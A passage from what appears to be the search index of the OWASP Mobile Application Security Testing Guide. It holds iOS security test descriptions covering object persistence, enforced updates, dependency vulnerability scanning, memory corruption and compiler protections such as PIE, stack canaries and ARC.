</p>","tags":["ios","L2","test","MASWE-0046"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0079/","title":"MASTG-TEST-0079: Testing Object Persistence","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0079: Testing Object Persistence (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-8","masvs-code-4"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0079/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-8","masvs-code-4"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0079/#static-analysis","title":"Static Analysis","text":"<p>All different flavors of object persistence share the following concerns:</p> <ul> <li>If you use object persistence to store sensitive information on the device, then make sure that the data is encrypted: either at the database level, or specifically at the value level.</li> <li>Need to guarantee the integrity of the information? Use an HMAC mechanism or sign the information stored. Always verify the HMAC/signature before processing the actual information stored in the objects.</li> <li>Make sure that keys used in the two notions above are safely stored in the KeyChain and well protected. See the chapter \"Data Storage on iOS\" for more details.</li> <li>Ensure that the data within the deserialized object is carefully validated before it is actively used (e.g., no exploit of business/application logic is possible).</li> <li>Do not use persistence mechanisms that use Runtime Reference to serialize/deserialize objects in high-risk applications, as the attacker might be able to manipulate the steps to execute business logic via this mechanism (see the chapter \"iOS Anti-Reversing Defenses\" for more details).</li> <li>Note that in Swift 2 and beyond, a Mirror can be used to read parts of an object, but cannot be used to write against the object.</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-8","masvs-code-4"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0079/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>There are several ways to perform dynamic analysis:</p> <ul> <li>For the actual persistence: Use the techniques described in the \"Data Storage on iOS\" chapter.</li> <li>For the serialization itself: Use a debug build or use Frida / objection to see how the serialization methods are handled (e.g., whether the application crashes or extra information can be extracted by enriching the objects).</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-8","masvs-code-4"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0080/","title":"MASTG-TEST-0080: Testing Enforced Updating","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0080: Testing Enforced Updating (ios)</p> <p> Send Feedback</p>","tags":["ios","L2","test","MSTG-ARCH-9","masvs-code-2"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0080/#overview","title":"Overview","text":"","tags":["ios","L2","test","MSTG-ARCH-9","masvs-code-2"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0080/#static-analysis","title":"Static Analysis","text":"<p>First see whether there is an update mechanism at all: if it is not yet present, it might mean that users cannot be forced to update. If the mechanism is present, see whether it enforces \"always latest\" and whether that is indeed in line with the business strategy. Otherwise check if the mechanism is supporting to update to a given version. Make sure that every entry of the application goes through the updating mechanism in order to make sure that the update-mechanism cannot be bypassed.</p>","tags":["ios","L2","test","MSTG-ARCH-9","masvs-code-2"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0080/#dynamic-analysis","title":"Dynamic analysis","text":"<p>In order to test for proper updating: try downloading an older version of the application with a security vulnerability, either by a release from the developers or by using a third party app-store. Next, verify whether or not you can continue to use the application without updating it. If an update prompt is given, verify if you can still use the application by canceling the prompt or otherwise circumventing it through normal application usage. This includes validating whether the backend will stop calls to vulnerable backends and/or whether the vulnerable app-version itself is blocked by the backend. Lastly, try modifying the version number of an app while intercepting its traffic using a Machine-in-the-Middle (MITM) proxy, and observe how the backend responds (including whether the change is recorded, for example).</p>","tags":["ios","L2","test","MSTG-ARCH-9","masvs-code-2"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0085/","title":"MASTG-TEST-0085: Checking for Weaknesses in Third Party Libraries","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Identify Dependencies with Known Vulnerabilities by Scanning Dependency Managers Artifacts</li> <li> Dependencies with Known Vulnerabilities in the App's SBOM</li> </ul>","tags":["ios","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0085/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0085/#static-analysis","title":"Static Analysis","text":"","tags":["ios","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0085/#detecting-vulnerabilities-of-third-party-libraries","title":"Detecting vulnerabilities of third party libraries","text":"<p>In order to ensure that the libraries used by the apps are not carrying vulnerabilities, one can best check the dependencies installed by CocoaPods or Carthage.</p>","tags":["ios","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0085/#swift-package-manager","title":"Swift Package Manager","text":"<p>In case Swift Package Manager is used for managing third party dependencies, the following steps can be taken to analyze the third party libraries for vulnerabilities:</p> <p>First, at the root of the project, where the Package.swift file is located, type</p> <pre><code>swift build\n</code></pre> <p>Next, check the file Package.resolved for the actual versions used and inspect the given libraries for known vulnerabilities.</p> <p>You can utilize the OWASP Dependency-Check's experimental Swift Package Manager Analyzer to identify the Common Platform Enumeration (CPE) naming scheme of all dependencies and any corresponding Common Vulnerability and Exposure (CVE) entries. Scan the application's Package.swift file and generate a report of known vulnerable libraries with the following command:</p> <pre><code>dependency-check  --enableExperimental --out . --scan Package.swift\n</code></pre>","tags":["ios","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0085/#cocoapods","title":"CocoaPods","text":"<p>In case CocoaPods is used for managing third party dependencies, the following steps can be taken to analyze the third party libraries for vulnerabilities.</p> <p>First, at the root of the project, where the Podfile is located, execute the following commands:</p> <pre><code>sudo gem install cocoapods\npod install\n</code></pre> <p>Next, now that the dependency tree has been built, you can create an overview of the dependencies and their versions by running the following commands:</p> <pre><code>sudo gem install cocoapods-dependencies\npod dependencies\n</code></pre> <p>The result of the steps above can now be used as input for searching different vulnerability feeds for known vulnerabilities.</p> <p>Note:</p> <ol> <li>If the developer packs all dependencies in terms of its own support library using a .podspec file, then this .podspec file can be checked with the experimental CocoaPods podspec checker.</li> <li>If the project uses CocoaPods in combination with Objective-C, SourceClear can be used.</li> <li>Using CocoaPods with HTTP-based links instead of HTTPS might allow for Machine-in-the-Middle (MITM) attacks during the download of the dependency, allowing an attacker to replace (parts of) the library with other content. Therefore, always use HTTPS.</li> </ol> <p>You can utilize the OWASP Dependency-Check's experimental CocoaPods Analyzer to identify the Common Platform Enumeration (CPE) naming scheme of all dependencies and any corresponding Common Vulnerability and Exposure (CVE) entries. Scan the application's *.podspec and/or Podfile.lock files and generate a report of known vulnerable libraries with the following command:</p> <pre><code>dependency-check  --enableExperimental --out . --scan Podfile.lock\n</code></pre>","tags":["ios","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0085/#carthage","title":"Carthage","text":"<p>In case Carthage is used for third party dependencies, then the following steps can be taken to analyze the third party libraries for vulnerabilities.</p> <p>First, at the root of the project, where the Cartfile is located, type</p> <pre><code>brew install carthage\ncarthage update --platform iOS\n</code></pre> <p>Next, check the Cartfile.resolved for actual versions used and inspect the given libraries for known vulnerabilities.</p> <p>Note, at the time of writing this chapter, there is no automated support for Carthage based dependency analysis known to the authors. At least, this feature was already requested for the OWASP DependencyCheck tool but not yet implemented (see the GitHub issue).</p>","tags":["ios","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0085/#discovered-library-vulnerabilities","title":"Discovered library vulnerabilities","text":"<p>When a library is found to contain vulnerabilities, then the following reasoning applies:</p> <ul> <li>Is the library packaged with the application? Then check whether the library has a version in which the vulnerability is patched. If not, check whether the vulnerability actually affects the application. If that is the case or might be the case in the future, then look for an alternative which provides similar functionality, but without the vulnerabilities.</li> <li>Is the library not packaged with the application? See if there is a patched version in which the vulnerability is fixed. If this is not the case, check if the implications of the vulnerability for the build process. Could the vulnerability impede a build or weaken the security of the build-pipeline? Then try looking for an alternative in which the vulnerability is fixed.</li> </ul> <p>In case frameworks are added manually as linked libraries:</p> <ol> <li>Open the xcodeproj file and check the project properties.</li> <li>Go to the tab Build Phases and check the entries in Link Binary With Libraries for any of the libraries. See earlier sections on how to obtain similar information using  MobSF.</li> </ol> <p>In the case of copy-pasted sources: search the header files (in case of using Objective-C) and otherwise the Swift files for known method names for known libraries.</p> <p>Next, note that for hybrid applications, you will have to check the JavaScript dependencies with RetireJS. Similarly for Xamarin, you will have to check the C# dependencies.</p> <p>Last, if the application is a high-risk application, you will end up vetting the library manually. In that case there are specific requirements for native code, which are similar to the requirements established by the MASVS for the application as a whole. Next to that, it is good to vet whether all best practices for software engineering are applied.</p>","tags":["ios","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0085/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>The dynamic analysis of this section comprises of two parts: the actual license verification and checking which libraries are involved in case of missing sources.</p> <p>It need to be validated whether the copyrights of the licenses have been adhered to. This often means that the application should have an <code>about</code> or <code>EULA</code> section in which the copy-right statements are noted as required by the license of the third party library.</p>","tags":["ios","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0085/#listing-application-libraries","title":"Listing Application Libraries","text":"<p>When performing app analysis, it is important to also analyze the app dependencies (usually in form of libraries or so-called iOS Frameworks) and ensure that they don't contain any vulnerabilities. Even when you don't have the source code, you can still identify some of the app dependencies using tools like  objection,  MobSF or the <code>otool -L</code> command. Objection is the recommended tool, since it provides the most accurate results and it is easy to use. It contains a module to work with iOS Bundles, which offers two commands: <code>list_bundles</code> and <code>list_frameworks</code>.</p> <p>The <code>list_bundles</code> command lists all of the application's bundles that are not related to Frameworks. The output contains executable name, bundle id, version of the library and path to the library.</p> <pre><code>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios bundles list_bundles\nExecutable    Bundle                                       Version  Path\n------------  -----------------------------------------  ---------  -------------------------------------------\nDVIA-v2       com.highaltitudehacks.DVIAswiftv2.develop          2  ...-1F0C-4DB1-8C39-04ACBFFEE7C8/DVIA-v2.app\nCoreGlyphs    com.apple.CoreGlyphs                               1  ...m/Library/CoreServices/CoreGlyphs.bundle\n</code></pre> <p>The <code>list_frameworks</code> command lists all of the application's bundles that represent Frameworks.</p> <pre><code>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios bundles list_frameworks\nExecutable      Bundle                                     Version    Path\n--------------  -----------------------------------------  ---------  -------------------------------------------\nBolts           org.cocoapods.Bolts                        1.9.0      ...8/DVIA-v2.app/Frameworks/Bolts.framework\nRealmSwift      org.cocoapods.RealmSwift                   4.1.1      ...A-v2.app/Frameworks/RealmSwift.framework\n                                                                      ...ystem/Library/Frameworks/IOKit.framework\n...\n</code></pre>","tags":["ios","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0086/","title":"MASTG-TEST-0086: Memory Corruption Bugs","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0086: Memory Corruption Bugs (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-CODE-8","masvs-code-4"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0086/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-CODE-8","masvs-code-4"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0086/#static-analysis","title":"Static Analysis","text":"<p>Are there native code parts? If so: check for the given issues in the general memory corruption section. Native code is a little harder to spot when compiled. If you have the sources then you can see that C files use .c source files and .h header files and C++ uses .cpp files and .h files. This is a little different from the .swift and the .m source files for Swift and Objective-C. These files can be part of the sources, or part of third party libraries, registered as frameworks and imported through various tools, such as Carthage, the Swift Package Manager or Cocoapods.</p> <p>For any managed code (Objective-C / Swift) in the project, check the following items:</p> <ul> <li>The doubleFree issue: when <code>free</code> is called twice for a given region instead of once.</li> <li>Retaining cycles: look for cyclic dependencies by means of strong references of components to one another which keep materials in memory.</li> <li>Using instances of <code>UnsafePointer</code> can be managed wrongly, which will allow for various memory corruption issues.</li> <li>Trying to manage the reference count to an object by <code>Unmanaged</code> manually, leading to wrong counter numbers and a too late/too soon release.</li> </ul> <p>A great talk is given on this subject at Realm academy and a nice tutorial to see what is actually happening is provided by Ray Wenderlich on this subject.</p> <p>Please note that with Swift 5 you can only deallocate full blocks, which means the playground has changed a bit.</p>","tags":["ios","L1","L2","test","MSTG-CODE-8","masvs-code-4"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0086/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>There are various tools provided which help to identify memory bugs within Xcode, such as the Debug Memory graph introduced in Xcode 8 and the Allocations and Leaks instrument in Xcode.</p> <p>Next, you can check whether memory is freed too fast or too slow by enabling <code>NSAutoreleaseFreedObjectCheckEnabled</code>, <code>NSZombieEnabled</code>, <code>NSDebugEnabled</code> in Xcode while testing the application.</p> <p>There are various well written explanations which can help with taking care of memory management. These can be found in the reference list of this chapter.</p>","tags":["ios","L1","L2","test","MSTG-CODE-8","masvs-code-4"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0087/","title":"MASTG-TEST-0087: Make Sure That Free Security Features Are Activated","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Position Independent Code (PIC) not Enabled</li> <li> Stack Canaries Not enabled</li> <li> Automatic Reference Counting (ARC) not enabled</li> </ul>","tags":["ios","L1","L2","test","MSTG-CODE-9","masvs-code-4","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0087/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-CODE-9","masvs-code-4","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0087/#static-analysis","title":"Static Analysis","text":"<p>You can use radare2 to check the binary security features.</p> <p>Let's use the Damn Vulnerable iOS App DVIA v1 as an example. Open its main binary with radare2:</p> <pre><code>r2 DamnVulnerableIOSApp\n</code></pre> <p>And run the following commands:</p> <pre><code>[0x1000180c8]&gt; i~pic,canary\ncanary   true\npic      true\n</code></pre> <pre><code>[0x1000180c8]&gt; is~release,retain\n124  0x002951e0 0x1000891e0 LOCAL  FUNC 0        imp.dispatch_release\n149  0x00294e80 0x100088e80 LOCAL  FUNC 0        imp.objc_autorelease\n150  0x00294e8c 0x100088e8c LOCAL  FUNC 0        imp.objc_autoreleasePoolPop\n151  0x00294e98 0x100088e98 LOCAL  FUNC 0        imp.objc_autoreleasePoolPush\n152  0x00294ea4 0x100088ea4 LOCAL  FUNC 0        imp.objc_autoreleaseReturnValue\n165  0x00294f40 0x100088f40 LOCAL  FUNC 0        imp.objc_release\n167  0x00294f58 0x100088f58 LOCAL  FUNC 0        imp.objc_retainAutorelease\n168  0x00294f64 0x100088f64 LOCAL  FUNC 0        imp.objc_retainAutoreleaseReturnValue\n169  0x00294f70 0x100088f70 LOCAL  FUNC 0        imp.objc_retainAutoreleasedReturnValue\n</code></pre> <p>All the features are enabled in these examples:</p> <ul> <li> <p>PIE (Position Independent Executable): indicated by the flag <code>pic true</code>.</p> <ul> <li>Applies to all apps independently of the language used.</li> <li>Applies only to the main executable (<code>MH_EXECUTE</code>), not to dynamic libraries (<code>MH_DYLIB</code>).</li> </ul> </li> <li> <p>Stack Canary: indicated by the flag <code>canary true</code>.</p> <ul> <li>Applies to apps containing Objective-C code.</li> <li>Not necessarily required for pure Swift apps (Swift is memory safe by design).</li> <li>Especially important for apps containing C/C++ code, as they provide direct access to memory and pointers, making them more vulnerable to buffer overflows.</li> </ul> </li> <li> <p>ARC (Automatic Reference Counting): indicated by symbols such as <code>objc_autorelease</code> or <code>objc_retainAutorelease</code>.</p> <ul> <li>Important for binaries containing Objective-C code.</li> <li>For binaries written purely in Swift, ARC is enabled by default.</li> <li>ARC is not relevant for binaries written purely in C/C++, as it's a memory management feature specific to Objective-C and Swift.</li> </ul> </li> </ul>","tags":["ios","L1","L2","test","MSTG-CODE-9","masvs-code-4","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0087/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>These checks can be performed dynamically using  objection. Here's one example:</p> <pre><code>com.yourcompany.PPClient on (iPhone: 13.2.3) [usb] # ios info binary\nName                  Type     Encrypted    PIE    ARC    Canary    Stack Exec    RootSafe\n--------------------  -------  -----------  -----  -----  --------  ------------  ----------\nPayPal                execute  True         True   True   True      False         False\nCardinalMobile        dylib    False        False  True   True      False         False\nFraudForce            dylib    False        False  True   True      False         False\n...\n</code></pre>","tags":["ios","L1","L2","test","MSTG-CODE-9","masvs-code-4","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0228/","title":"MASTG-TEST-0228: Position Independent Code (PIC) not Enabled","text":"","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0228/#overview","title":"Overview","text":"<p>PIE (Position Independent Executables) are designed to enhance security by allowing executables to be loaded at random memory addresses, mitigating certain types of attacks.</p> <p>In the context Mach-O file format of iOS applications:</p> <ul> <li>PIE is applicable to executables with the <code>MH_EXECUTE</code> file type, which essentially means the main app binary (e.g. <code>YourApp.app/YourApp</code>).</li> <li>Shared libraries with the <code>MH_DYLIB</code> file type (dylibs and frameworks) are inherently position-independent and do not utilize the <code>MH_PIE</code> flag.</li> </ul> <p>This test case checks if the main executable is compiled with PIE.</p>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0228/#steps","title":"Steps","text":"<ol> <li>Extract the application and identify the main binary ( Obtaining and Extracting Apps).</li> <li>Run  Obtaining Compiler-Provided Security Features on the main binary and grep for \"pic\" or the corresponding keyword used by the selected tool.</li> </ol>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0228/#observation","title":"Observation","text":"<p>The output should list if PIC is enabled or disabled.</p>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0228/#evaluation","title":"Evaluation","text":"<p>The test case fails if PIC is disabled.</p>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0229/","title":"MASTG-TEST-0229: Stack Canaries Not enabled","text":"","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0229/#overview","title":"Overview","text":"<p>This test case checks if the main binary or any libraries of the app are compiled without stack canaries and therefore lack stack smashing protection, a common mitigation technique against buffer overflow attacks.</p> <p>This test applies to all binaries and libraries:</p> <ul> <li>It is especially important for non-memory safe languages like Objective-C or C/C++.</li> <li>For pure Swift apps, checking for stack canaries can be usually skipped, as Swift is considered a memory safe by design and conventional parsing techniques cannot detect stack canaries in Swift binaries (see the \"canary \u2013 exceptions\" section of this blog post).</li> </ul> <p>To differentiate between Objective-C and Swift binaries, you can inspect the imports and linked libraries. Detecting Objective-C binaries is straightforward, but detecting pure Swift binaries is more challenging because depending on the Swift version and compiler settings, the binary may still contain Objective-C symbols or libraries. See the \"identifying objc vs swift\" section of this blog post for more details.</p>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0229/#steps","title":"Steps","text":"<ol> <li>Extract the application and identify the main binary ( Obtaining and Extracting Apps).</li> <li>Identify all shared libraries ( Get Shared Libraries).</li> <li>Run  Obtaining Compiler-Provided Security Features on the main binary and each shared library.</li> <li>If the output contains the symbol <code>__stack_chk_fail</code> it indicates stack canaries are enabled.</li> </ol>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0229/#observation","title":"Observation","text":"<p>The output should contain a list of symbols of the main binary and each shared library.</p>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0229/#evaluation","title":"Evaluation","text":"<p>The test case fails any binary or library is not purely Swift but does not contain methods indicating stack canaries like <code>objc_autorelease</code> or <code>objc_retainAutorelease</code>.</p> <p>Note: Checking for the <code>__stack_chk_fail</code> symbol only indicates that stack smashing protection is enabled somewhere in the app. While stack canaries are typically enabled or disabled for the entire binary, there may be corner cases where only parts of the application are protected. For example, if the app developer statically links a library with stack smashing protection enabled, but disables it for the entire application.</p> <p>If you want to be sure that specific security-critical methods are sufficiently protected, you need to reverse-engineer each of them and manually check for stack smashing protection.</p> <p>When evaluating this please note that there are potential expected false positives for which the test case should be considered as passed. To be certain for these cases, they require manual review of the original source code and the compilation flags used.</p> <p>The following examples cover some of the false positive cases that might be encountered:</p>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0229/#use-of-memory-safe-languages","title":"Use of Memory Safe Languages","text":"<p>The Flutter framework does not use stack canaries because of the way Dart mitigates buffer overflows.</p>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0229/#compiler-optimizations","title":"Compiler Optimizations","text":"<p>Sometimes, due to the size of the library and the optimizations applied by the compiler, it might be possible that the library was originally compiled with stack canaries but they were optimized out. For example, this is the case for some react native apps. They are built with <code>-fstack-protector-strong</code> but when attempting to search for <code>stack_chk_fail</code> inside the binary files, it is not found. The React Native developers in this case declare that they won't be adding <code>-fstack-protector-all</code> as, in their case, they consider that doing so will add a performance hit for no effective security gain.</p>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0230/","title":"MASTG-TEST-0230: Automatic Reference Counting (ARC) not enabled","text":"","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0230/#overview","title":"Overview","text":"<p>This test case checks if ARC (Automatic Reference Counting) is enabled in iOS apps. ARC is a compiler feature in Objective-C and Swift that automates memory management, reducing the likelihood of memory leaks and other related issues. Enabling ARC is crucial for maintaining the security and stability of iOS applications.</p> <ul> <li>Objective-C Code: ARC can be enabled by compiling with the <code>-fobjc-arc</code> flag in Clang.</li> <li>Swift Code: ARC is enabled by default.</li> <li>C/C++ Code: ARC is not applicable, as it pertains specifically to Objective-C and Swift.</li> </ul> <p>When ARC is enabled, binaries will include symbols such as <code>objc_autorelease</code> or <code>objc_retainAutorelease</code>.</p>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0230/#steps","title":"Steps","text":"<ol> <li>Extract the application and identify the main binary ( Obtaining and Extracting Apps).</li> <li>Identify all shared libraries ( Get Shared Libraries).</li> <li>Run  Obtaining Compiler-Provided Security Features on the main binary and each shared library looking for ARC symbols like <code>objc_autorelease</code> or <code>objc_retainAutorelease</code>.</li> </ol>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0230/#observation","title":"Observation","text":"<p>The output should contain a list of symbols of the main binary and each shared library.</p>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0230/#evaluation","title":"Evaluation","text":"<p>The test fails if any binary or library containing Objective-C or Swift code is missing ARC-related symbols. The presence of symbols such as <code>_objc_msgSend</code> (Objective-C) or <code>_swift_allocObject</code> (Swift) without corresponding ARC symbols indicates that ARC may not be enabled.</p> <p>Note: Checking for these symbols only indicates that ARC is enabled somewhere in the app. While ARC is typically enabled or disabled for the entire binary, there can be corner cases where only parts of the application or libraries are protected. For example, if the app developer statically links a library that has ARC enabled, but disables it for the entire application.</p> <p>If you want to be sure that specific security-critical methods are adequately protected, you need to reverse-engineer each of them and manually check for ARC, or request the source code from the developer.</p>","tags":["ios","L2","test","MASWE-0116"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0273/","title":"MASTG-TEST-0273: Identify Dependencies with Known Vulnerabilities by Scanning Dependency Managers Artifacts","text":"","tags":["ios","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0273/#overview","title":"Overview","text":"<p>In this test case we are identifying dependencies with known vulnerabilities in iOS. Dependencies are integrated through dependency managers, and there might be one or more of them being used. We therefore need all of the relevant artifacts created by them to analyse them with a SCA scanning tool.</p>","tags":["ios","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0273/#steps","title":"Steps","text":"<ol> <li> <p>In order to do this in the most efficient way you would need to ask the developer(s) which dependency managers are being used and to share the relevant file(s) created by them. Follow  Software Composition Analysis (SCA) of iOS Dependencies by Scanning Package Manager Artifacts for on overview of the package managers and request for the relevant files.</p> </li> <li> <p>Run a SCA analysis tool such as  dependency-check against the file(s) created by the dependency manager(s) and look for the use of vulnerable dependencies.</p> </li> </ol>","tags":["ios","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0273/#observation","title":"Observation","text":"<p>The output should include the dependency name and the CVE identifiers for any dependency with known vulnerabilities.</p>","tags":["ios","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0273/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find dependencies with known vulnerabilities.</p>","tags":["ios","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0273/#demos","title":"Demos","text":"<p> MASTG-DEMO-0053: Identifying Insecure Dependencies in SwiftPM through SBOM creation  MASTG-DEMO-0052: Scanning Package Manager Artifacts for Insecure iOS Dependencies </p>","tags":["ios","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0275/","title":"MASTG-TEST-0275: Dependencies with Known Vulnerabilities in the App's SBOM","text":"","tags":["ios","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0275/#overview","title":"Overview","text":"<p>This test case checks for dependencies with known vulnerabilities in iOS applications by using a Software Bill of Materials (SBOM). The SBOM should be in CycloneDX format, which is a standard for describing the components and dependencies of software.</p>","tags":["ios","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0275/#steps","title":"Steps","text":"<ol> <li>Either ask the development team to share a SBOM in CycloneDX format, or, if you have access to the original source code, create one following  Software Composition Analysis (SCA) of iOS Dependencies by Creating a SBOM.</li> <li>Upload the SBOM to  dependency-track.</li> <li>Inspect the  dependency-track project for the use of vulnerable dependencies.</li> </ol>","tags":["ios","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0275/#observation","title":"Observation","text":"<p>The output should include a list of dependencies with names and CVE identifiers, if any.</p>","tags":["ios","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/ios/MASVS-CODE/MASTG-TEST-0275/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find dependencies with known vulnerabilities.</p>","tags":["ios","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0061/","title":"MASTG-TEST-0061: Verifying the Configuration of Cryptographic Standard Algorithms","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Insufficient Key Sizes</li> <li> Broken Symmetric Encryption Algorithms</li> <li> Broken Hashing Algorithms</li> </ul>","tags":["ios","L1","L2","test","MSTG-CRYPTO-2","MSTG-CRYPTO-3","masvs-crypto-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0061/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-CRYPTO-2","MSTG-CRYPTO-3","masvs-crypto-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-CRYPTO/MASTG-TEST-0061/#static-analysis","title":"Static Analysis","text":"<p>For each of the libraries that are used by the application, the used algorithms and cryptographic configurations need to be verified to make sure they are not deprecated and used correctly.</p> <p>Pay attention to how-to-be-removed key-holding datastructures and plain-text data structures are defined. If the keyword <code>let</code> is used, then you create an immutable structure which is harder to wipe from memory. Make sure that it is part of a parent structure which can be easily removed from memory (e.g. a <code>struct</code> that lives temporally).</p> <p>Ensure that the best practices outlined in the \"Cryptography for Mobile Apps\" chapter are 